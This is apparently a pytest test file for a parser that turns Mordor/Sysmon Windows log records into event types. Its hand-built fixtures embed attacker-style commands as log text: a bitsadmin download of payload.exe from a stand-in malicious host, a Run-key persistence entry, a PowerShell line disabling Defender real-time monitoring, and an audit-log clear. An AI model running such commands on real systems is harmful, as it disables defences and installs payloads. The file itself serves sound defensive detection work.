"""
Tests for app.mordor_parser.parse_mordor.

Uses hand-built NDJSON fixtures (not a real downloaded dataset, so CI
doesn't depend on network access) that mimic the real Mordor/Sysmon schema
exactly, covering all 7 EventType mappings plus malformed-row handling.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from app.models import EventType
from app.mordor_parser import MordorParseError, parse_mordor, parse_mordor_line


def _sysmon_process_create() -> dict:
    return {
        "SourceName": "Microsoft-Windows-Sysmon",
        "Hostname": "HOST01.lab.local",
        "TimeCreated": "2020-09-15 03:29:44.169",
        "EventID": 1,
        "Message": (
            "Process Create:\n"
            "RuleName: -\n"
            "UtcTime: 2020-09-15 03:29:44.169\n"
            "ProcessId: 3060\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "CommandLine: cmd.exe /c whoami\n"
            "User: LAB\\user01\n"
        ),
    }


def _sysmon_network_connection() -> dict:
    return {
        "SourceName": "Microsoft-Windows-Sysmon",
        "Hostname": "HOST01.lab.local",
        "TimeCreated": "2020-09-15 03:30:10.500",
        "EventID": 3,
        "Message": (
            "Network connection detected:\n"
            "UtcTime: 2020-09-15 03:30:10.500\n"
            "ProcessId: 3060\n"
            "Image: C:\\Windows\\System32\\cmd.exe\n"
            "DestinationIp: 185.220.101.1\n"
            "DestinationPort: 443\n"
            "User: LAB\\user01\n"
        ),
    }


def _sysmon_file_create_plain() -> dict:
    return {
        "SourceName": "Microsoft-Windows-Sysmon",
        "Hostname": "HOST01.lab.local",
        "TimeCreated": "2020-09-15 03:31:00.000",
        "EventID": 11,
        "Message": (
            "File created:\n"
            "UtcTime: 2020-09-15 03:31:00.000\n"
            "Image: C:\\Windows\\explorer.exe\n"
            "TargetFilename: C:\\Users\\user01\\Desktop\\notes.txt\n"
            "User: LAB\\user01\n"
        ),
    }


def _sysmon_file_create_download() -> dict:
    return {
        "SourceName": "Microsoft-Windows-Sysmon",
        "Hostname": "HOST01.lab.local",
        "TimeCreated": "2020-09-15 03:32:00.000",
        "EventID": 11,
        "Message": (
            "File created:\n"
            "UtcTime: 2020-09-15 03:32:00.000\n"
            "Image: C:\\Windows\\System32\\bitsadmin.exe\n"
            "CommandLine: bitsadmin /transfer job /download /priority high "
            "http://malicious.example/payload.exe C:\\temp\\payload.exe\n"
            "TargetFilename: C:\\temp\\payload.exe\n"
            "User: LAB\\user01\n"
        ),
    }


def _sysmon_registry_set() -> dict:
    return {
        "SourceName": "Microsoft-Windows-Sysmon",
        "Hostname": "HOST01.lab.local",
        "TimeCreated": "2020-09-15 03:33:00.000",
        "EventID": 13,
        "Message": (
            "Registry value set:\n"
            "UtcTime: 2020-09-15 03:33:00.000\n"
            "TargetObject: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater\n"
            "Details: C:\\temp\\payload.exe\n"
            "User: LAB\\user01\n"
        ),
    }


def _windows_powershell_scriptblock() -> dict:
    return {
        "SourceName": "Microsoft-Windows-PowerShell",
        "Hostname": "HOST01.lab.local",
        "TimeCreated": "2020-09-15 03:34:00.000",
        "EventID": 4104,
        "Message": (
            "Creating Scriptblock text:\n"
            "ScriptBlockText: Set-MpPreference -DisableRealtimeMonitoring $true\n"
            "User: LAB\\user01\n"
        ),
    }


def _windows_log_cleared() -> dict:
    return {
        "SourceName": "Microsoft-Windows-Eventlog",
        "Hostname": "HOST01.lab.local",
        "TimeCreated": "2020-09-15 03:35:00.000",
        "EventID": 1102,
        "Message": ("The audit log was cleared.\nSubjectUserName: user01\n"),
    }


def _windows_process_creation_4688() -> dict:
    return {
        "SourceName": "Microsoft-Windows-Security-Auditing",
        "Hostname": "HOST01.lab.local",
        "@timestamp": "2020-09-15T03:36:00.000Z",
        "EventID": 4688,
        "Message": (
            "A new process has been created.\n"
            "SubjectUserName: user01\n"
            "NewProcessName: C:\\Windows\\System32\\net.exe\n"
        ),
    }


ALL_VALID_ROWS = [
    _sysmon_process_create(),
    _sysmon_network_connection(),
    _sysmon_file_create_plain(),
    _sysmon_file_create_download(),
    _sysmon_registry_set(),
    _windows_powershell_scriptblock(),
    _windows_log_cleared(),
    _windows_process_creation_4688(),
]


def _write_ndjson(path: Path, rows: list) -> Path:
    with path.open("w", encoding="utf-8") as f:
        for row in rows:
            if isinstance(row, str):
                f.write(row + "\n")
            else:
                f.write(json.dumps(row) + "\n")
    return path


# ---------------------------------------------------------------------------
# parse_mordor_line — unit-level tests for the mapping logic
# ---------------------------------------------------------------------------


def test_process_create_maps_to_process_execution():
    event = parse_mordor_line(json.dumps(_sysmon_process_create()), 0, "test.ndjson")
    assert event.event_type == EventType.PROCESS_EXECUTION
    assert event.actor == "LAB\\user01"
    assert "cmd.exe" in event.target


def test_network_connection_maps_correctly():
    event = parse_mordor_line(
        json.dumps(_sysmon_network_connection()), 0, "test.ndjson"
    )
    assert event.event_type == EventType.NETWORK_CONNECTION
    assert event.target == "185.220.101.1"


def test_file_create_without_download_tool_is_file_creation():
    event = parse_mordor_line(json.dumps(_sysmon_file_create_plain()), 0, "test.ndjson")
    assert event.event_type == EventType.FILE_CREATION


def test_file_create_with_bitsadmin_is_file_download():
    event = parse_mordor_line(
        json.dumps(_sysmon_file_create_download()), 0, "test.ndjson"
    )
    assert event.event_type == EventType.FILE_DOWNLOAD


def test_registry_set_maps_to_registry_modification():
    event = parse_mordor_line(json.dumps(_sysmon_registry_set()), 0, "test.ndjson")
    assert event.event_type == EventType.REGISTRY_MODIFICATION
    assert "Run\\Updater" in event.target


def test_powershell_scriptblock_maps_correctly():
    event = parse_mordor_line(
        json.dumps(_windows_powershell_scriptblock()), 0, "test.ndjson"
    )
    assert event.event_type == EventType.POWERSHELL_EXECUTION
    assert "DisableRealtimeMonitoring" in event.target


def test_log_cleared_maps_to_log_deletion():
    event = parse_mordor_line(json.dumps(_windows_log_cleared()), 0, "test.ndjson")
    assert event.event_type == EventType.LOG_DELETION


def test_4688_process_creation_uses_atsign_timestamp():
    event = parse_mordor_line(
        json.dumps(_windows_process_creation_4688()), 0, "test.ndjson"
    )
    assert event.event_type == EventType.PROCESS_EXECUTION
    assert event.timestamp.year == 2020


def test_provenance_id_format():
    event = parse_mordor_line(
        json.dumps(_sysmon_process_create()), 42, "apt29_day1.ndjson"
    )
    assert event.event_id == "apt29_day1.ndjson:42"


def test_unmapped_event_id_raises():
    row = _sysmon_process_create()
    row["EventID"] = 9999  # not in our mapping table
    with pytest.raises(MordorParseError):
        parse_mordor_line(json.dumps(row), 0, "test.ndjson")


def test_missing_event_id_raises():
    row = _sysmon_process_create()
    del row["EventID"]
    with pytest.raises(MordorParseError):
        parse_mordor_line(json.dumps(row), 0, "test.ndjson")


def test_malformed_json_raises():
    with pytest.raises(json.JSONDecodeError):
        parse_mordor_line("{not valid json", 0, "test.ndjson")


# ---------------------------------------------------------------------------
# parse_mordor — file-level tests (bad-row policy, sorting, diagnostics)
# ---------------------------------------------------------------------------


def test_parse_mordor_all_seven_event_types(tmp_path: Path):
    ndjson_file = _write_ndjson(tmp_path / "mixed.ndjson", ALL_VALID_ROWS)
    result = parse_mordor(ndjson_file)

    assert result.skipped == 0
    assert result.total_rows == len(ALL_VALID_ROWS)
    assert len(result.events) == len(ALL_VALID_ROWS)

    found_types = {e.event_type for e in result.events}
    expected_types = {
        EventType.PROCESS_EXECUTION,
        EventType.NETWORK_CONNECTION,
        EventType.FILE_CREATION,
        EventType.FILE_DOWNLOAD,
        EventType.REGISTRY_MODIFICATION,
        EventType.POWERSHELL_EXECUTION,
        EventType.LOG_DELETION,
    }
    assert found_types == expected_types


def test_parse_mordor_sorts_chronologically(tmp_path: Path):
    # Write rows out of order; parser must sort by timestamp.
    reversed_rows = list(reversed(ALL_VALID_ROWS))
    ndjson_file = _write_ndjson(tmp_path / "reversed.ndjson", reversed_rows)
    result = parse_mordor(ndjson_file)

    timestamps = [e.timestamp for e in result.events]
    assert timestamps == sorted(timestamps)


def test_parse_mordor_bad_row_policy(tmp_path: Path):
    rows = [
        _sysmon_process_create(),  # valid
        "{this is not json at all",  # malformed JSON -> skip
        _sysmon_network_connection(),  # valid
    ]
    bad_event_id_row = _sysmon_registry_set()
    bad_event_id_row["EventID"] = 99999  # unmapped -> skip
    rows.append(bad_event_id_row)

    ndjson_file = _write_ndjson(tmp_path / "mixed_bad.ndjson", rows)
    result = parse_mordor(ndjson_file)

    assert result.total_rows == 4
    assert len(result.events) == 2
    assert result.skipped == 2
    assert len(result.errors) == 2


def test_parse_mordor_blank_lines_ignored(tmp_path: Path):
    path = tmp_path / "with_blanks.ndjson"
    with path.open("w", encoding="utf-8") as f:
        f.write(json.dumps(_sysmon_process_create()) + "\n")
        f.write("\n")  # blank line
        f.write("   \n")  # whitespace-only line
        f.write(json.dumps(_sysmon_network_connection()) + "\n")

    result = parse_mordor(path)
    assert result.total_rows == 2  # blank lines don't count as rows
    assert result.skipped == 0
    assert len(result.events) == 2


def test_parse_mordor_provenance_resolves_to_source_line(tmp_path: Path):
    ndjson_file = _write_ndjson(tmp_path / "prov.ndjson", ALL_VALID_ROWS)
    result = parse_mordor(ndjson_file)

    lines = ndjson_file.read_text(encoding="utf-8").splitlines()
    for event in result.events:
        _, _, line_no_str = event.event_id.rpartition(":")
        line_no = int(line_no_str)
        # The event_id's line number must point back to a real source line
        # whose JSON contains this event's EventID.
        raw = json.loads(lines[line_no])
        assert int(raw["EventID"]) == event.metadata["_event_id"]


def test_parse_mordor_missing_file_raises(tmp_path: Path):
    with pytest.raises(FileNotFoundError):
        parse_mordor(tmp_path / "does_not_exist.ndjson")


def test_parse_mordor_metadata_preserves_raw_fields(tmp_path: Path):
    ndjson_file = _write_ndjson(tmp_path / "meta.ndjson", [_sysmon_process_create()])
    result = parse_mordor(ndjson_file)
    event = result.events[0]

    # Raw top-level fields and parsed Message fields must both survive.
    assert event.metadata["EventID"] == 1
    assert event.metadata["CommandLine"] == "cmd.exe /c whoami"
    assert event.metadata["ProcessId"] == "3060"
